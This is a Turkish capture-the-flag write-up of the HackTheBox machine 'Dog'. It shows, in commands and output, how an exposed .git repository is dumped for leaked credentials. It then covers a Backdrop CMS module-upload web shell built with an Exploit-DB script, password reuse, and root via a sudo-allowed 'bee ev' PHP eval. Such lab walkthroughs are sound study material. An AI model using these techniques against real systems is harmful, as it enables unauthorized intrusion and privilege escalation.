---
title: 'HackTheBox | Dog WriteUp'
author: appdone
categories: [HackTheBox Machines]
tags: [git, remote code execution, sudo, linux]
render_with_liquid: false
media_subpath: /images/hackthebox_dog/
image:
  path: logo.webp
---

## Özet

Dog, Backdrop CMS adında bir içerik yönetim sistemi kullanan kolay seviye linux bir makinedir. Nmap taraması sonucunda .git/ dizinini keşfedecek ve repoyu indireceğiz. Bu repo üzerinden içerik yönetim sistemindeki kullanıcılardan birinin parolasını ve kullanıcı adını öğreneceğiz. Daha sonra ise içerik yönetim sistemi üzerinden sisteme shell dosyamızı yükleyecek ve bir reverse shell bağlantısı alacağız. Sistemdeki kullanıcılardan birinin aynı parolayı kullanması nedeniyle o kullanıcıya geçiş yapacağız. Daha sonra ise root haklarıyla bir dosyayı çalıştırabileceğimizi fark edecek ve o dosya üzerinden yetki yükselteceğiz.

## Keşif aşaması

### Nmap taraması

```console
$ nmap -sVC -T4 10.10.11.58
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-title: Home | Dog
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 80 numaralı portun incelenmesi

![](1.webp){: width="1200" height="600" }

Nmap taramasının sonucunda, 80 numaralı HTTP servisinin üzerinde bir `Git` reposu olduğunu ve kullanılan web uygulamasının `Backdrop CMS` olduğunu öğrendik.

#### Git reposunun incelenmesi

`Git` reposunu `git-dumper` aracının yardımıyla indirelim.

```console
$ python3 git-dumper.py http://10.10.11.58/.git/ dog
...
[-] Fetching http://10.10.11.58/.git/objects/ff/d522e1da8660cb25dce831f19efa284753b691 [200]
[-] Fetching http://10.10.11.58/.git/objects/ff/c8b7a2f5179db2788971de0e8a265032d6ddab [200]
[-] Fetching http://10.10.11.58/.git/objects/ff/f99b60388f8dabaa3ccb41a86ac100b29a75fa [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 2873 paths from the index
```

Dosyaları incelerken settings.php dosyasının içerisinde mysql bilgilerini buluyoruz. Ancak mysql servisine dışarıdan bağlanamayacağımız için elde ettiğimiz parolayı başka bir yerde kullanmamız gerekebilir.

```php
$database = 'mysql://root:[GİZLi]@127.0.0.1/backdrop';                                                                                                                            
$database_prefix = '';
```

Web uygulamasında `root` isminde bir kullanıcı bulunmadığından giriş yapamadım. Web uygulamasında bir kaç gönderi paylaşıldığını görmüştüm, dolayısıyla gönderileri paylaşan kullanıcıların isimlerini de denedim ama nafile. Hakkında sayfasındaki `support@doh.htb` mailinden yola çıkarak `Git` reposunda kullanıcı isimleri olup olmadığını kontrol ettim ve bir kullanıcı adı buldum.

```console
$grep -r "@dog.htb"
...
files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "[GİZLi]@dog.htb"
```

## Sömürü aşaması

### Modüller üzerinden php shell yüklenmesi

Elde ettiğimiz kullanıcı bilgileri ile sisteme giriş yapalım. Daha sonra `reverse shell` kodlarımızı yükleyebilmek için sayfaları kontrol edelim. Temaların bulunduğu kısımda sadece içerikleri düzenleyebileceğimiz bir sayfa var. Modüller sayfasında ise keyfimize göre modül ekleyemiyoruz. Bu hazır içerik yönetim sistemine nasıl php shell yükleyebileceğimi öğrenmek için internette arama yaptım ve [bu](https://www.exploit-db.com/raw/52021) sayfa ile karşılaştım. Programı çalıştırdıktan sonra bize bir `.zip` dosyası veriyor ve verdiği dizin üzerinden siteye yüklememizi istiyor.

```console
$ python3 52021 http://10.10.11.58                                                                                                                                                        
Backdrop CMS 1.27.1 - Remote Command Execution Exploit                                                                                                                                        
Evil module generating...                                                                                                                                                                     
Evil module generated! shell.zip                                                                                                                                                              
Go to http://10.10.11.58/admin/modules/install and upload the shell.zip for Manual Installation.                                                                                              
Your shell address: http://10.10.11.58/modules/shell/shell.php
```

Oluşturduğu `.zip` dosyasını `.tar.gz` formatına çevirdikten sonra bahsettiği http://10.10.11.58/?p=admin/modules/install adresine gidiyor ve `manuel install` linkini seçiyoruz. Sonrada sıkıştırdığımız dosyayı yüklüyoruz.

![](2.webp){: width="900" height="500" }

Dosya yüklendikten sonra programda belirtilen adrese gidiyor ve buradaki web shell üzerinden ncat ile bir bağlantı elde ediyoruz.

![](3.webp){: width="900" height="500" }

## Yetki yükseltme

### johncusack

Sisteme girdikten sonra bayrağı alabilmek için /home dizine yöneldim. Burada iki kullanıcı dizini bulunuyor. `jobert` dizininin içerisinde herhangi bir bilgi yok. `johncusack` kullanıcısının dizinini ise görüntüleyemiyoruz. Elimizdeki tek parolayı denediğimizde ise başarıyla kullanıcıya geçiş yapabiliyoruz.

```console
www-data@dog:/home$ su johncusack
Password: 
johncusack@dog:/home$
```

### root

Sudo yetkilerimizi kontrol ettiğimizde `bee` isimli bir dosyayı root kullanıcısı adına çalıştırabileceğimizi görüyoruz.

```console
johncusack@dog:~$ ls
user.txt
johncusack@dog:~$ sudo -l
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

Bu dosyayı çalıştırdıktan sonra kullanılabilir parametreler ile karşılaşıyoruz. Görünüşe göre `ev` veya `php-eval` parametresini kullanarak kod çalıştırabiliyoruz.

```console
johncusack@dog:~$ sudo /usr/local/bin/bee
...
eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.
...
```

Bu dosya php ile yazılmış, dolayısıyla php dilinde komut çalıştırabileceğimiz bir kod girmemiz gerekiyor, ancak nedenini anlamadığım bir şekilde aşağıdaki hata ile karşılaşıyorum.

```console
johncusack@dog:~$ sudo /usr/local/bin/bee ev "system('/bin/bash');"

 ✘  The required bootstrap level for 'eval' is not ready.
```

Dosyayı biraz inceledikten sorna Backdrop CMS'i yönetmek için kullanılan bir dosya olduğunu fark ettim. Diğer komutlarıda çalıştırdıktan sonra `Backdrop` içerik dosyasının adresini bulamadığını fark ettim.

```console
johncusack@dog:~$ sudo /usr/local/bin/bee sqlc
PHP Fatal error:  Uncaught Error: Class 'Database' not found in /backdrop_tool/bee/commands/db.bee.inc:279
Stack trace:
#0 /backdrop_tool/bee/includes/command.inc(99): sql_bee_callback()
#1 /backdrop_tool/bee/bee.php(30): bee_process_command()
#2 {main}
  thrown in /backdrop_tool/bee/commands/db.bee.inc on line 279
```

Komutları tekrar gözden geçirdikten sonra `--root` parametresi ile CMS'in adresini gösterebileceğimi gördüm. Daha sonra ise komutu çalıştırdım ve root kullanıcısının haklarına sahip oldum.

```console
johncusack@dog:~$ sudo /usr/local/bin/bee ev "system('/bin/bash');" --root=/var/www/html/
root@dog:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
```
